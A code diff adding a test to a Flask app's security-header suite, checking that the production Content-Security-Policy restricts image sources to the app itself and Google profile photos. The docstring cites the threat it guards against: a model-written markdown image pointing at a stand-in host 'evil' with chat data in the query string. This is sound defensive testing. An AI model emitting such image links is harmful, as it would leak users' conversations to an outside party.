@@ -51,6 +51,16 @@ class TestSecurityHeaders:
         directives = [d.strip() for d in response.headers["Content-Security-Policy"].split(";")]
         assert "media-src 'self' blob:" in directives
 
+    def test_csp_blocks_arbitrary_external_images(self, client: FlaskClient) -> None:
+        """A model-written ![](https://evil/?d=<chat data>) must not load; only
+        Google profile photos come from outside the app."""
+        from src.config import Config
+
+        with patch.object(Config, "FLASK_ENV", "production"):
+            response = client.get("/api/health")
+        directives = [d.strip() for d in response.headers["Content-Security-Policy"].split(";")]
+        assert "img-src 'self' data: blob: https://*.googleusercontent.com" in directives
+
     def test_no_csp_in_development_mode(self, client: FlaskClient) -> None:
         from src.config import Config
 
